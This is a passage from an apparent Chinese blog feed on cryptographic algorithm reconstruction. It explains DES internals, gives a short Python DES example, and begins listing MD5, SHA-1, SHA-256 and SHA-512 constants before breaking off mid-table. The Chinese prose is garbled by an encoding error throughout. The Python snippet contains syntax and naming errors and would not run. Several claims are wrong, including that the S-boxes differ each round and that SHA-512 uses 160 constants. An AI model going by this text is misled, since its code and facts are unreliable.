</p><p>ç”±æ­¤å¯è§ï¼Œæ‰©å±•è¿‡ç¨‹çš„æ¯ä¸€ä½éƒ½æ˜¯æ ¹æ®ä¸Šè¿°çš„ç½®æ¢è¡¨ä»è¾“å…¥çš„32ä½æ•°æ®å—ä¸­æå–å‡ºæ¥çš„ã€‚åŸå§‹æ•°æ®çš„ç¬¬32ä½è¢«è¡¥å……åˆ°äº†æ–°å¢åˆ—çš„ç¬¬ä¸€ä¸ªï¼Œç¬¬5ä½è¢«è¡¥å……åˆ°äº†ç¬¬äºŒä¸ªæ–°å¢åˆ—çš„ç¬¬ä¸€ä¸ªï¼Œä»¥æ­¤ç±»æ¨â€¦</p><h4 id="å­å¯†é’¥ç”Ÿæˆ"><a href="#å­å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å­å¯†é’¥ç”Ÿæˆ"></a>å­å¯†é’¥ç”Ÿæˆ</h4><p>å‚è€ƒä¸Šé¢ç¬¬ä¸€éƒ¨åˆ†ï¼šå­å¯†é’¥Kçš„ç”Ÿæˆ</p><h4 id="å½“å‰è½®æ¬¡çš„å­å¯†é’¥ä¸æ‹“å±•çš„48ä½Rè¿›è¡Œå¼‚æˆ–è¿ç®—"><a href="#å½“å‰è½®æ¬¡çš„å­å¯†é’¥ä¸æ‹“å±•çš„48ä½Rè¿›è¡Œå¼‚æˆ–è¿ç®—" class="headerlink" title="å½“å‰è½®æ¬¡çš„å­å¯†é’¥ä¸æ‹“å±•çš„48ä½Rè¿›è¡Œå¼‚æˆ–è¿ç®—"></a>å½“å‰è½®æ¬¡çš„å­å¯†é’¥ä¸æ‹“å±•çš„48ä½Rè¿›è¡Œå¼‚æˆ–è¿ç®—</h4><p>å½“å‰è½®æ¬¡çš„å­å¯†é’¥Kiä¸æ‹“å±•çš„48ä½Riè¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚è¿ç®—ç»“æœä¼šä½œä¸ºæ¥ä¸‹æ¥Sç›’æ›¿æ¢çš„è¾“å…¥</p><h4 id="Sç›’æ›¿æ¢ï¼ˆSubstitution-Box-substitutionï¼‰"><a href="#Sç›’æ›¿æ¢ï¼ˆSubstitution-Box-substitutionï¼‰" class="headerlink" title="Sç›’æ›¿æ¢ï¼ˆSubstitution Box substitutionï¼‰"></a>Sç›’æ›¿æ¢ï¼ˆSubstitution Box substitutionï¼‰</h4><p>Sç›’æ›¿æ¢ï¼ˆSubstitution Box substitutionï¼‰æ˜¯ä¸€ç§åœ¨å¯†ç å­¦ä¸­å¹¿æ³›ä½¿ç”¨çš„åŠ å¯†æŠ€æœ¯ã€‚å®ƒæ˜¯å°†æ˜æ–‡ä¸­çš„ä¸€ç»„æ¯”ç‰¹æ˜ å°„åˆ°å¯†æ–‡ä¸­çš„ä¸€ç»„æ¯”ç‰¹çš„è¿‡ç¨‹ï¼Œç”¨äºå¢å¼ºå¯†ç çš„å®‰å…¨æ€§ã€‚DESä¸­Sç›’æ›¿æ¢ç”¨äºå°†ä¸Šä¸€è½®å¼‚æˆ–è¿ç®—çš„48ä½ç»“æœæ˜ å°„åˆ°32ä½è¾“å‡ºä¸­å»ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171657656.png" alt="img"> </p><p>åŒæ ·çš„ï¼ŒSç›’ä¹Ÿæ˜¯ä¸€ç§ç½®æ¢è¡¨ã€‚åœ¨DESçš„æ¯ä¸€è½®è®¡ç®—ä¸­Sç›’éƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™é‡Œæˆ‘ä»¥ç¬¬ä¸€è½®è®¡ç®—ä¸­çš„Sç›’ä¸ºä¾‹ã€‚ä»ä¸Šå›¾ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼ŒSç›’å†…éƒ¨æœ‰8ä¸ªSå—ï¼Œè®°ä½œS1-S8ã€‚æ¯ä¸ªSå—éƒ½ä¼šæ¥æ”¶6ä½å­—ç¬¦ä½œä¸ºè¾“å…¥å¹¶è¾“å‡ºå››ä½å­—ç¬¦ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥ç¬¬ä¸€ä¸ªSç›’S1ä¸ºä¾‹ã€‚ä»–æ˜¯ä¸€ä¸ª4*16çš„ç½®æ¢è¡¨ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171657689.png" alt="img"> </p><p>ä¾‹å¦‚è¾“å…¥101010åˆ°S1ä¸­ã€‚S1ä¼šå°†è¿™å…­ä½çš„ç¬¬ä¸€ä½å’Œç¬¬å…­ä½æ‹¿å‡ºæ¥10ä½œä¸ºS1çš„è¡Œï¼Œä¸­é—´å››ä½0101æ‹¿å‡ºæ¥ä½œä¸ºS1çš„åˆ—ã€‚æˆ‘ä»¬è½¬æ¢æˆåè¿›åˆ¶ï¼Œæ­¤æ—¶æ˜ å°„åˆ°è¿™ä¸ªSç›’çš„ä½ç½®å°±æ˜¯(2,5)å¯¹åº”Sç›’çš„<strong>ç¬¬3è¡Œç¬¬6åˆ—</strong>ï¼ˆç´¢å¼•éƒ½ä»0å¼€å§‹æ•°ï¼‰ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171657133.png" alt="img"> </p><p>æ‰€ä»¥è¿™ä¸ªè¾“å…¥çš„ç»“æœæ˜¯6ï¼Œå°†6è½¬åŒ–ä¸ºäºŒè¿›åˆ¶110ï¼ŒSç›’çš„è¾“å‡ºæ˜¯4ä½ï¼Œæ‰€ä»¥å¾—S(101010)&#x3D;0110</p><p>å› æ­¤ï¼Œå¯ä»¥çœ‹åˆ°Sç›’å…¶å®æ˜¯ä¸€ç§éçº¿æ€§çš„åŠ å¯†æŠ€æœ¯ï¼Œå®ƒèƒ½å¤ŸæŠµå¾¡è®¸å¤šä¼ ç»Ÿçš„å¯†ç åˆ†ææ”»å‡»ï¼Œå¦‚å·®åˆ†æ”»å‡»å’Œçº¿æ€§æ”»å‡»ã€‚</p><h4 id="Pç›’æ›¿æ¢"><a href="#Pç›’æ›¿æ¢" class="headerlink" title="Pç›’æ›¿æ¢"></a>Pç›’æ›¿æ¢</h4><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171658744.png" alt="img"> </p><p>Pç›’æ›¿æ¢å°†Sç›’æ›¿æ¢çš„32ä½è¾“å‡ºä½œä¸ºè¾“å…¥ï¼Œç»è¿‡ä¸Šè¿°å›ºå®šçš„æ›¿æ¢è¡¨è¿›è¡Œæ›¿æ¢åå³ä¸ºæœ€åFè½®å‡½æ•°çš„ç»“æœã€‚</p><p><strong>è¯¥ç»“æœF(R0,K0)ä¸L0è¿›è¡Œå¼‚æˆ–è¿ç®—å¾—åˆ°ä¸‹ä¸€è½®çš„å³åŠéƒ¨åˆ†R1</strong></p><h3 id="é€†ç½®æ¢"><a href="#é€†ç½®æ¢" class="headerlink" title="é€†ç½®æ¢"></a>é€†ç½®æ¢</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171658935.png" alt="img"> </p><p>åœ¨ç»è¿‡16è½®æ¬¡è®¡ç®—åï¼ŒDESä¼šå¯¹æœ€åçš„ç»“æœè¿›è¡Œæœ€åä¸€æ¬¡ç½®æ¢ã€‚å³ä¸ºæœ€åçš„è¾“å‡ºç»“æœã€‚</p><h1 id="äºŒ-DESç®—æ³•ä¼˜ç¼ºç‚¹"><a href="#äºŒ-DESç®—æ³•ä¼˜ç¼ºç‚¹" class="headerlink" title="äºŒ DESç®—æ³•ä¼˜ç¼ºç‚¹"></a>äºŒ DESç®—æ³•ä¼˜ç¼ºç‚¹</h1><p>ã€ä¼˜ç‚¹ã€‘</p><p>å®‰å…¨æ€§é«˜ï¼šDESç®—æ³•ä½¿ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œç›¸åŒçš„æ˜æ–‡ä½¿ç”¨ä¸åŒçš„å¯†é’¥åŠ å¯†åå¾—åˆ°çš„å¯†æ–‡æ˜¯ä¸åŒçš„ã€‚å¯†é’¥è¶Šé•¿ï¼ŒåŠ å¯†çš„å®‰å…¨æ€§å°±è¶Šé«˜ã€‚</p><p>ç®—æ³•ç®€å•ï¼šDESç®—æ³•çš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹éç®€å•ï¼ŒåŸºäºå¯¹ç§°åŠ å¯†ï¼Œä½¿ç”¨ç›¸åŒçš„keyè¿›è¡ŒåŠ è§£å¯†ã€‚</p><p>é€‚ç”¨å¹¿æ³›ï¼šDESç®—æ³•æ˜¯æœ€æ—©ä¹Ÿæ˜¯æœ€å¹¿æ³›ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ä¹‹ä¸€ï¼Œè¢«å¹¿æ³›åº”ç”¨äºç”µå­å•†åŠ¡ã€ç”µå­é‚®ä»¶ã€è™šæ‹Ÿç§äººç½‘ç»œç­‰é¢†åŸŸï¼Œå…·æœ‰å¹¿æ³›çš„é€‚ç”¨æ€§å’Œå¯ç§»æ¤æ€§ã€‚</p><p>ã€ç¼ºç‚¹ã€‘</p><p>å¯†é’¥é•¿åº¦è¾ƒçŸ­ï¼šDESç®—æ³•ä½¿ç”¨56ä½å¯†é’¥ï¼Œè™½ç„¶åœ¨å½“æ—¶è¶³å¤Ÿå®‰å…¨ï¼Œä½†åœ¨å½“å‰è®¡ç®—æœºçš„å¤„ç†èƒ½åŠ›ä¸‹ï¼Œå·²ç»ä¸è¶³ä»¥ä¿è¯åŠ å¯†çš„å®‰å…¨æ€§ï¼Œæ˜“å—åˆ°æš´åŠ›ç ´è§£æ”»å‡»ã€‚</p><p>æ— æ³•æŠµæŠ—å·®åˆ†å¯†ç åˆ†ææ”»å‡»ï¼šDESç®—æ³•æ— æ³•æŠµæŠ—å·®åˆ†å¯†ç åˆ†ææ”»å‡»ï¼Œè¿™ç§æ”»å‡»å¯ä»¥é€šè¿‡æ¯”è¾ƒç›¸åŒæ˜æ–‡çš„å¯†æ–‡ï¼Œåˆ†æåŠ å¯†ç®—æ³•çš„è¡Œä¸ºå¹¶æ¨æ–­å‡ºå¯†é’¥ã€‚</p><p>æ¯”è¾ƒæ…¢ï¼šç”±äºDESç®—æ³•æ˜¯ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œéœ€è¦å¯¹64ä½çš„æ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼ŒåŠ å¯†é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œä¸é€‚ç”¨äºå¯¹å¤§é‡æ•°æ®è¿›è¡Œå®æ—¶åŠ å¯†å’Œè§£å¯†ã€‚</p><h1 id="ä¸‰-DESç®—æ³•å®ç°"><a href="#ä¸‰-DESç®—æ³•å®ç°" class="headerlink" title="ä¸‰ DESç®—æ³•å®ç°"></a>ä¸‰ DESç®—æ³•å®ç°</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†å¯†é’¥è½¬æ¢ä¸º8å­—èŠ‚é•¿çš„äºŒè¿›åˆ¶æ•°æ®</span></span><br><span class="line">key = <span class="string">b&#x27;mysecret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºDESåŠ å¯†å™¨å¯¹è±¡</span></span><br><span class="line">cipher = DES.new(key, DES.MODE ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜æ–‡æ•°æ®</span></span><br><span class="line">plaintext = <span class="string">b&#x27;This is a secret message.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨PKCS7å¡«å……å¯¹æ˜æ–‡è¿›è¡Œå¡«å……</span></span><br><span class="line">padded_plaintext = pad(plaintext, DEs.block size, style<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†æ˜æ–‡æ•°æ®</span></span><br><span class="line">ciphertext = cipher.encrypt (padded plaintext)</span><br><span class="line"><span class="comment"># è¾“å‡ºåŠ å¯†åçš„æ•°æ®</span></span><br><span class="line"><span class="built_in">print</span> (ciphertext)</span><br></pre></td></tr></table></figure><h2 id="Cå®ç°"><a href="#Cå®ç°" class="headerlink" title="Cå®ç°"></a>Cå®ç°</h2><p><a href="https://github.com/dhuertas/DES/blob/master/des.c">https://github.com/dhuertas/DES/blob/master/des.c</a></p><h2 id="Pythonä¸ä¾èµ–å¤–éƒ¨åº“çš„DESç®—æ³•å®ç°"><a href="#Pythonä¸ä¾èµ–å¤–éƒ¨åº“çš„DESç®—æ³•å®ç°" class="headerlink" title="Pythonä¸ä¾èµ–å¤–éƒ¨åº“çš„DESç®—æ³•å®ç°"></a>Pythonä¸ä¾èµ–å¤–éƒ¨åº“çš„DESç®—æ³•å®ç°</h2><p><a href="https://www.cnblogs.com/wangyanzhong123/p/10575739.html">https://www.cnblogs.com/wangyanzhong123/p/10575739.html</a></p><p><a href="https://github.com/foreverhza/DES-python">https://github.com/foreverhza/DES-python</a></p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> DES </tag>
            
            <tag> å¯¹ç§°åŠ å¯†ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹å“ˆå¸Œç®—æ³•æ€»ç»“</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-å¸¸è§å“ˆå¸Œç®—æ³•ä»‹ç»"><a href="#ä¸€-å¸¸è§å“ˆå¸Œç®—æ³•ä»‹ç»" class="headerlink" title="ä¸€ å¸¸è§å“ˆå¸Œç®—æ³•ä»‹ç»"></a>ä¸€ å¸¸è§å“ˆå¸Œç®—æ³•ä»‹ç»</h1><h2 id="å“ˆå¸Œç®—æ³•å¯¹æ¯”"><a href="#å“ˆå¸Œç®—æ³•å¯¹æ¯”" class="headerlink" title="å“ˆå¸Œç®—æ³•å¯¹æ¯”"></a>å“ˆå¸Œç®—æ³•å¯¹æ¯”</h2><table><thead><tr><th><strong>ç®—æ³•</strong></th><th><strong>è¿”å›å€¼é•¿åº¦(hex)</strong></th><th><strong>åˆå§‹åŒ–é“¾æ¥å‘é‡(hex)</strong></th><th><strong>å¸¸é‡è¡¨(kè¡¨)ã€ä¸ªã€‘</strong></th></tr></thead><tbody><tr><td><strong>MD5</strong></td><td>32byte</td><td>32byte(4ä¸ª)</td><td>64</td></tr><tr><td><strong>SHA1</strong></td><td>40byte</td><td>40byte(5ä¸ª)</td><td>4</td></tr><tr><td><strong>SHA256</strong></td><td>64byte</td><td>64byte(8ä¸ª)</td><td>64</td></tr><tr><td><strong>SHA512</strong></td><td>128byte</td><td>128byte(8ä¸ª)</td><td>160(32byte)</td></tr></tbody></table><h3 id="åˆå§‹åŒ–é“¾æ¥å‘é‡"><a href="#åˆå§‹åŒ–é“¾æ¥å‘é‡" class="headerlink" title="åˆå§‹åŒ–é“¾æ¥å‘é‡"></a>åˆå§‹åŒ–é“¾æ¥å‘é‡</h3><p>MD5ï¼š4ä¸ª&#x3D;32byte</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context-&gt;state[0] = 0x67452301;</span><br><span class="line">context-&gt;state[1] = 0xefcdab89;</span><br><span class="line">context-&gt;state[2] = 0x98badcfe;</span><br><span class="line">context-&gt;state[3] = 0x10325476;</span><br></pre></td></tr></table></figure><p>SHA1ï¼š5ä¸ª&#x3D;40byte</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define INIT_DATA_h0 0x67452301UL</span><br><span class="line">#define INIT_DATA_h1 0xefcdab89UL</span><br><span class="line">#define INIT_DATA_h2 0x98badcfeUL</span><br><span class="line">#define INIT_DATA_h3 0x10325476UL</span><br><span class="line">#define INIT_DATA_h4 0xc3d2e1f0UL</span><br><span class="line"></span><br><span class="line">c-&gt;h0=INIT_DATA_h0;</span><br><span class="line">c-&gt;h1=INIT_DATA_h1;</span><br><span class="line">c-&gt;h2=INIT_DATA_h2;</span><br><span class="line">c-&gt;h3=INIT_DATA_h3;</span><br><span class="line">c-&gt;h4=INIT_DATA_h4;</span><br></pre></td></tr></table></figure><p>SHA256ï¼š8ä¸ª&#x3D;64byte</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctx-&gt;hash[0] = 0x6a09e667;</span><br><span class="line">ctx-&gt;hash[1] = 0xbb67ae85;</span><br><span class="line">ctx-&gt;hash[2] = 0x3c6ef372; </span><br><span class="line">ctx-&gt;hash[3] = 0xa54ff53a;</span><br><span class="line">ctx-&gt;hash[4] = 0x510e527f; </span><br><span class="line">ctx-&gt;hash[5] = 0x9b05688c;</span><br><span class="line">ctx-&gt;hash[6] = 0x1f83d9ab;</span><br><span class="line">ctx-&gt;hash[7] = 0x5be0cd19;</span><br></pre></td></tr></table></figure><p>SHA512ï¼š8ä¸ª&#x3D;128byteï¼ˆè¿™å—å¯ä»¥çœ‹åˆ°<strong>SHA512çš„å‰8ä¸ª</strong>åå…­è¿›åˆ¶ä½å°±æ˜¯SHA256çš„åˆå§‹åŒ–é“¾æ¥å˜é‡ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context-&gt;state[0] = 0x6a09e667f3bcc908ULL;</span><br><span class="line">context-&gt;state[1] = 0xbb67ae8584caa73bULL;</span><br><span class="line">context-&gt;state[2] = 0x3c6ef372fe94f82bULL;</span><br><span class="line">context-&gt;state[3] = 0xa54ff53a5f1d36f1ULL;</span><br><span class="line">context-&gt;state[4] = 0x510e527fade682d1ULL;</span><br><span class="line">context-&gt;state[5] = 0x9b05688c2b3e6c1fULL;</span><br><span class="line">context-&gt;state[6] = 0x1f83d9abfb41bd6bULL;</span><br><span class="line">context-&gt;state[7] = 0x5be0cd19137e2179ULL;</span><br></pre></td></tr></table></figure><h3 id="å¸¸é‡è¡¨-kè¡¨-ä¸ª"><a href="#å¸¸é‡è¡¨-kè¡¨-ä¸ª" class="headerlink" title="å¸¸é‡è¡¨(kè¡¨)[ä¸ª]"></a><strong>å¸¸é‡è¡¨(kè¡¨)[ä¸ª]</strong></h3><p>MD5ï¼š64ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Round 1 */</span><br><span class="line">FF (a, b, c, d, x[ 0], S11, 0xd76aa478); /* 1 */</span><br><span class="line">FF (d, a, b, c, x[ 1], S12, 0xe8c7b756); /* 2 */</span><br><span class="line">FF (c, d, a, b, x[ 2], S13, 0x242070db); /* 3 */</span><br><span class="line">FF (b, c, d, a, x[ 3], S14, 0xc1bdceee); /* 4 */</span><br><span class="line">FF (a, b, c, d, x[ 4], S11, 0xf57c0faf); /* 5 */</span><br><span class="line">FF (d, a, b, c, x[ 5], S12, 0x4787c62a); /* 6 */</span><br><span class="line">FF (c, d, a, b, x[ 6], S13, 0xa8304613); /* 7 */</span><br><span class="line">FF (b, c, d, a, x[ 7], S14, 0xfd469501); /* 8 */</span><br><span class="line">FF (a, b, c, d, x[ 8], S11, 0x698098d8); /* 9 */</span><br><span class="line">FF (d, a, b, c, x[ 9], S12, 0x8b44f7af); /* 10 */</span><br><span class="line">FF (c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */</span><br><span class="line">FF (b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */</span><br><span class="line">FF (a, b, c, d, x[12], S11, 0x6b901122); /* 13 */</span><br><span class="line">FF (d, a, b, c, x[13], S12, 0xfd987193); /* 14 */</span><br><span class="line">FF (c, d, a, b, x[14], S13, 0xa679438e); /* 15 */</span><br><span class="line">FF (b, c, d, a, x[15], S14, 0x49b40821); /* 16 */</span><br><span class="line">/* Round 2 */</span><br><span class="line">GG (a, b, c, d, x[ 1], S21, 0xf61e2562); /* 17 */</span><br><span class="line">GG (d, a, b, c, x[ 6], S22, 0xc040b340); /* 18 */</span><br><span class="line">GG (c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */</span><br><span class="line">GG (b, c, d, a, x[ 0], S24, 0xe9b6c7aa); /* 20 */</span><br><span class="line">GG (a, b, c, d, x[ 5], S21, 0xd62f105d); /* 21 */</span><br><span class="line">GG (d, a, b, c, x[10], S22,  0x2441453); /* 22 */</span><br><span class="line">GG (c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */</span><br><span class="line">GG (b, c, d, a, x[ 4], S24, 0xe7d3fbc8); /* 24 */</span><br><span class="line">GG (a, b, c, d, x[ 9], S21, 0x21e1cde6); /* 25 */</span><br><span class="line">GG (d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */</span><br><span class="line">GG (c, d, a, b, x[ 3], S23, 0xf4d50d87); /* 27 */</span><br><span class="line">GG (b, c, d, a, x[ 8], S24, 0x455a14ed); /* 28 */</span><br><span class="line">GG (a, b, c, d, x[13], S21, 0xa9e3e905); /* 29 */</span><br><span class="line">GG (d, a, b, c, x[ 2], S22, 0xfcefa3f8); /* 30 */</span><br><span class="line">GG (c, d, a, b, x[ 7], S23, 0x676f02d9); /* 31 */</span><br><span class="line">GG (b, c, d, a, x[12], S24, 0x8d2a4c8a); /* 32 */</span><br><span class="line">/* Round 3 */</span><br><span class="line">HH (a, b, c, d, x[ 5], S31, 0xfffa3942); /* 33 */</span><br><span class="line">HH (d, a, b, c, x[ 8], S32, 0x8771f681); /* 34 */</span><br><span class="line">HH (c, d, a, b, x[11], S33, 0x6d9d6122); /* 35 */</span><br><span class="line">HH (b, c, d, a, x[14], S34, 0xfde5380c); /* 36 */</span><br><span class="line">HH (a, b, c, d, x[ 1], S31, 0xa4beea44); /* 37 */</span><br><span class="line">HH (d, a, b, c, x[ 4], S32, 0x4bdecfa9); /* 38 */</span><br><span class="line">HH (c, d, a, b, x[ 7], S33, 0xf6bb4b60); /* 39 */</span><br><span class="line">HH (b, c, d, a, x[10], S34, 0xbebfbc70); /* 40 */</span><br><span class="line">HH (a, b, c, d, x[13], S31, 0x289b7ec6); /* 41 */</span><br><span class="line">HH (d, a, b, c, x[ 0], S32, 0xeaa127fa); /* 42 */</span><br><span class="line">HH (c, d, a, b, x[ 3], S33, 0xd4ef3085); /* 43 */</span><br><span class="line">HH (b, c, d, a, x[ 6], S34,  0x4881d05); /* 44 */</span><br><span class="line">HH (a, b, c, d, x[ 9], S31, 0xd9d4d039); /* 45 */</span><br><span class="line">HH (d, a, b, c, x[12], S32, 0xe6db99e5); /* 46 */</span><br><span class="line">HH (c, d, a, b, x[15], S33, 0x1fa27cf8); /* 47 */</span><br><span class="line">HH (b, c, d, a, x[ 2], S34, 0xc4ac5665); /* 48 */</span><br><span class="line">/* Round 4 */</span><br><span class="line">II (a, b, c, d, x[ 0], S41, 0xf4292244); /* 49 */</span><br><span class="line">II (d, a, b, c, x[ 7], S42, 0x432aff97); /* 50 */</span><br><span class="line">II (c, d, a, b, x[14], S43, 0xab9423a7); /* 51 */</span><br><span class="line">II (b, c, d, a, x[ 5], S44, 0xfc93a039); /* 52 */</span><br><span class="line">II (a, b, c, d, x[12], S41, 0x655b59c3); /* 53 */</span><br><span class="line">II (d, a, b, c, x[ 3], S42, 0x8f0ccc92); /* 54 */</span><br><span class="line">II (c, d, a, b, x[10], S43, 0xffeff47d); /* 55 */</span><br><span class="line">II (b, c, d, a, x[ 1], S44, 0x85845dd1); /* 56 */</span><br><span class="line">II (a, b, c, d, x[ 8], S41, 0x6fa87e4f); /* 57 */</span><br><span class="line">II (d, a, b, c, x[15], S42, 0xfe2ce6e0); /* 58 */</span><br><span class="line">II (c, d, a, b, x[ 6], S43, 0xa3014314); /* 59 */</span><br><span class="line">II (b, c, d, a, x[13], S44, 0x4e0811a1); /* 60 */</span><br><span class="line">II (a, b, c, d, x[ 4], S41, 0xf7537e82); /* 61 */</span><br><span class="line">II (d, a, b, c, x[11], S42, 0xbd3af235); /* 62 */</span><br><span class="line">II (c, d, a, b, x[ 2], S43, 0x2ad7d2bb); /* 63 */</span><br><span class="line">II (b, c, d, a, x[ 9], S44, 0xeb86d391); /* 64 */</span><br></pre></td></tr></table></figure><p>SHA1:4ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define K_00_190x5a827999UL</span><br><span class="line">#define K_20_39 0x6ed9eba1UL</span><br><span class="line">#define K_40_59 0x8f1bbcdcUL</span><br><span class="line">#define K_60_79 0xca62c1d6UL</span><br></pre></td></tr></table></figure><p>SHA256ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const uint32_t K[64] = &#123;</span><br><span class="line">        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,</span><br><span class="line">        0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,</span><br><span class="line">        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,</span><br><span class="line">        0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,</span><br><span class="line">        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,</span><br><span class="line">        0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,</span><br><span class="line">        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,</span><br><span class="line">        0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,</span><br><span class="line">        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,</span><br><span class="line">        0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,</span><br><span class="line">        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,</span><br><span class="line">        0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,</span><br><span class="line">        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,</span><br><span class="line">        0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,</span><br><span class="line">        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,</span><br><span class="line">        0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>SHA512ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static const unsigned long long K[80] = &#123;</span><br><span class="line">        0x428a2f98d728ae22ULL, 0x7137449123ef65cdULL, 0xb5c0fbcfec4d3b2fULL, 0xe9b5dba58189dbbcULL,</span><br><span class="line">        0x3956c25bf348b538ULL, 0x59f111f1b605d019ULL, 0x923f82a4af194f9bULL, 0xab1c5ed5da6d8118ULL,</span><br><span class="line">        0xd807aa98a3030242ULL, 0x12835b0145706fbeULL, 0x243185be4ee4b28cULL, 0x550c7dc3d5ffb4e2ULL,</span><br><span class="line">        0x72be5d74f27b896fULL, 0x80deb1fe3b1696b1ULL, 0x9bdc06a725c71235ULL, 0xc19bf174cf692694ULL,</span><br><span class="line">        0xe49b69c19ef14ad2ULL, 0xefbe4786384f25e3ULL, 0x0fc19dc68b8cd5b5ULL, 0x240ca1cc77ac9c65ULL,</span><br><span class="line">        0x2de92c6f592b0275ULL, 0x4a7484aa6ea6e483ULL, 0x5cb0a9dcbd41fbd4ULL, 0x76f988da831153b5ULL,</span><br><span class="line">        0x983e5152ee66dfabULL, 0xa831c66d2db43210ULL, 0xb00327c898fb213fULL, 0xbf597fc7beef0ee4ULL,</span><br><span class="line">        0xc6e00bf33da88fc2ULL, 0xd5a79147930aa725ULL, 0x06ca6351e003826fULL, 0x142929670a0e6e70ULL,</span><br><span class="line">        0x27b70a8546d22ffcULL, 0x2e1b21385c26c926ULL, 0x4d2c6dfc5ac42aedULL, 0x53380d139d95b3dfULL,</span><br><span class="line">        0x650a73548baf63deULL, 0x766a0abb3c77b2a8ULL, 0x81c2c92e47edaee6ULL, 0x92722c851482353bULL,</span><br><span class="line">        0xa2bfe8a14cf10364ULL, 0xa81a664bbc423001ULL, 0xc24b8b70d0f89791ULL, 0xc76c51a30654be30ULL,</span><br><span class="line">        0xd192e819d6ef5218ULL, 0xd69906245565a910ULL, 0xf40e35855771202aULL, 0x106aa07032bbd1b8ULL,</span><br><span class="line">        0x19a4c116b8d2d0c8ULL, 0x1e376c085141ab53ULL, 0x2748774cdf8eeb99ULL, 0x34b0bcb5e19b48a8ULL,</span><br><span class="line">        0x391c0cb3c5c95a63ULL, 0x4ed8aa4ae3418acbULL, 0x5b9cca4f7763e373ULL, 0x682e6ff3d6b2b8a3ULL,</span><br><span class="line">        0x748f82ee5defb2fcULL, 0x78a5636f43172f60ULL, 0x84c87814a1f0ab72ULL, 0x8cc702081a6439ecULL,</span><br><span class="line">        0x90befffa23631e28ULL, 0xa4506cebde82bde9ULL, 0xbef9a3f7b2c67915ULL, 0xc67178f2e372532bULL,</span><br><span class="line">        0xca273eceea26619cULL, 0xd186b8c721c0c207ULL, 0xeada7dd6cde0eb1eULL, 0xf57d4f7fee6ed178ULL,</span><br><span class="line">        0x06f067aa72176fbaULL, 0x0a637dc5a2c898a6ULL, 0x113f9804bef90daeULL, 